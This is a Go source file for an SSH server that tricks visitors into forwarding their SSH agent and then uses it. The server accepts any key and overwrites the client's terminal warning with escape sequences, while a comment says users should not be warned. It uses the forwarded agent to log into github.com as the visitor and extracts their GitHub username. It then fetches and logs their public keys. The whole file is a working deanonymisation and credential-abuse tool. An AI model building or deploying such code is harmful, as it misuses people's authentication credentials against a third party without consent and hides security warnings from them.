package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

const (
	keyPath = "id_rsa"
	keyBits = 2048
	port    = "22"
)

func main() {
	// Ensure we have a server private key
	private, err := ensurePrivateKey()
	if err != nil {
		log.Fatalf("Failed to setup private key: %v", err)
	}

	// Define SSH server config
	config := &ssh.ServerConfig{
		// Only allow public key authentication
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			// Here you would check if the key is authorized
			// For demonstration, we're accepting any key
			log.Printf("[INFO] Login attempt from %s@%s (version %s) with key: %s", conn.User(), conn.RemoteAddr(), conn.ClientVersion(), ssh.FingerprintSHA256(key))
			return &ssh.Permissions{
				Extensions: map[string]string{
					"pubkey-fp": ssh.FingerprintSHA256(key),
				},
			}, nil
		},
	}
	config.AddHostKey(private)

	// Start SSH server
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("[ERROR] Failed to listen on port %s: %v", port, err)
	}
	log.Printf("[SETUP] SSH server listening on port %s\n", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[ERROR] Failed to accept connection: %v", err)
			continue
		}
		go handleConn(conn, config)
	}
}

// ensurePrivateKey loads an existing SSH private key or generates a new one if it doesn't exist
func ensurePrivateKey() (ssh.Signer, error) {
	privateBytes, err := os.ReadFile(keyPath)
	if err == nil {
		// Key exists, try to parse it
		log.Println("[SETUP] Using existing SSH host key")
		return ssh.ParsePrivateKey(privateBytes)
	}

	// Key doesn't exist or can't be read, generate a new one
	log.Println("[SETUP] Generating new SSH host key...")

	// Generate private key
	privateKey, err := rsa.GenerateKey(rand.Reader, keyBits)
	if err != nil {
		return nil, fmt.Errorf("failed to generate private key: %v", err)
	}

	// Encode private key to PEM format
	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	privateKeyBytes := pem.EncodeToMemory(privateKeyPEM)

	// Save private key to file
	err = os.WriteFile(keyPath, privateKeyBytes, 0600)
	if err != nil {
		return nil, fmt.Errorf("failed to save private key: %v", err)
	}

	// Generate and save public key
	pub, err := ssh.NewPublicKey(&privateKey.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create public key: %v", err)
	}

	pubKeyBytes := ssh.MarshalAuthorizedKey(pub)
	err = os.WriteFile(keyPath+".pub", pubKeyBytes, 0644)
	if err != nil {
		return nil, fmt.Errorf("failed to save public key: %v", err)
	}

	log.Printf("[SETUP] SSH host keys generated and saved to %s and %s.pub", keyPath, keyPath)

	// Parse the generated key
	return ssh.ParsePrivateKey(privateKeyBytes)
}

func handleConn(conn net.Conn, config *ssh.ServerConfig) {
	defer conn.Close()

	// Perform SSH handshake
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
	if err != nil {
		log.Printf("Failed to handshake: %v", err)
		return
	}
	//log.Printf("[INFO] New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
	defer sshConn.Close()

	// Service incoming requests
	go ssh.DiscardRequests(reqs)

	// Service channels
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("Failed to accept channel: %v", err)
			continue
		}

		go handleChannel(channel, requests, sshConn)
	}
}

func handleChannel(channel ssh.Channel, requests <-chan *ssh.Request, sshConn *ssh.ServerConn) {
	defer channel.Close()

	for req := range requests {
		switch req.Type {
		case "shell":
			// Only respond to shell requests
			req.Reply(true, nil)

			// Check for SSH agent forwarding
			agentConn, agentReqs, err := sshConn.OpenChannel("auth-agent@openssh.com", nil)
			if err != nil {
				// Normally, ssh displays a warning message if agent forwarding is not enabled
				// We don't want users to be warned,
				io.WriteString(channel, "\r\033[2A\033[2KError: SSH agent forwarding is not enabled. Please reconnect with 'ssh -A'.\r\n\033[2K\r\n\033[2K")
				return
			}

			// Handle agent requests in a goroutine
			go ssh.DiscardRequests(agentReqs)
			defer agentConn.Close()

			// Set up connection to SSH agent
			agentClient := agent.NewClient(agentConn)

			retries := 10

			githubUsername, err := authenticateToGitHub(agentClient)
			for retries > 0 && err != nil {
				githubUsername, err = authenticateToGitHub(agentClient)
			}

			if err != nil {
				//io.WriteString(channel, fmt.Sprintf("Error connecting to GitHub: %v\n", err))
				io.WriteString(channel, "Error: Github user not found.  Please make sure you are forwarding a key that is added to Github.\r\n")
				return
			}

			// Fetch public keys from GitHub
			publicKeys, err := getPublicKeys(githubUsername)
			publicKeyStr := "unknown"
			if err == nil {
				publicKeyStr = ""
				for _, key := range publicKeys {
					publicKeyStr += fmt.Sprintf("%s, ", key)
				}
				publicKeyStr = strings.TrimSuffix(publicKeyStr, ", ")
			}

			fmt.Printf("[SUCCESS] Received GitHub username: %s, from %s@%s (version %s), public keys %s\n", githubUsername, sshConn.User(), sshConn.RemoteAddr(), sshConn.ClientVersion(), publicKeyStr)

			// Send welcome message with GitHub username
			welcomeMsg := fmt.Sprintf("Welcome! Your GitHub username is: %s\r\n", githubUsername)
			io.WriteString(channel, welcomeMsg)

			// Disconnect
			return

		case "pty-req":
			// Accept PTY request
			req.Reply(true, nil)

		default:
			req.Reply(false, nil)
		}
	}
}

func authenticateToGitHub(agentClient agent.Agent) (string, error) {
	// Configure SSH client that will connect to GitHub
	sshConfig := &ssh.ClientConfig{
		User: "git",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeysCallback(agentClient.Signers),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Not recommended for production
	}

	// Connect to GitHub's SSH server
	client, err := ssh.Dial("tcp", "github.com:22", sshConfig)
	if err != nil {
		return "", fmt.Errorf("failed to dial GitHub: %v", err)
	}
	defer client.Close()

	// Create a session
	session, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var output bytes.Buffer
	session.Stdout = &output
	session.Stderr = &output

	session.Shell()
	// Capture stdout

	session.Wait()

	// Parse GitHub username from output
	// Expected format: "Hi USERNAME! You've successfully authenticated, but GitHub does not provide shell access."
	outputStr := output.String()
	re := regexp.MustCompile(`Hi ([^!]+)!`)
	matches := re.FindStringSubmatch(outputStr)

	if len(matches) < 2 {
		return "", fmt.Errorf("could not extract GitHub username from: %s", outputStr)
	}

	username := strings.TrimSpace(matches[1])
	return username, nil
}

func getPublicKeys(username string) ([]string, error) {
	// Fetch the public key from GitHub API
	url := fmt.Sprintf("https://api.github.com/users/%s/keys", username)
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch public key: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to fetch public key: %s", resp.Status)
	}

	var keys []struct {
		Key string `json:"key"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&keys); err != nil {
		return nil, fmt.Errorf("failed to decode response: %v", err)
	}

	if len(keys) == 0 {
		return nil, fmt.Errorf("no public keys found for user %s", username)
	}

	var publicKeys []string
	for _, k := range keys {
		publicKeys = append(publicKeys, k.Key)
	}
	return publicKeys, nil
}

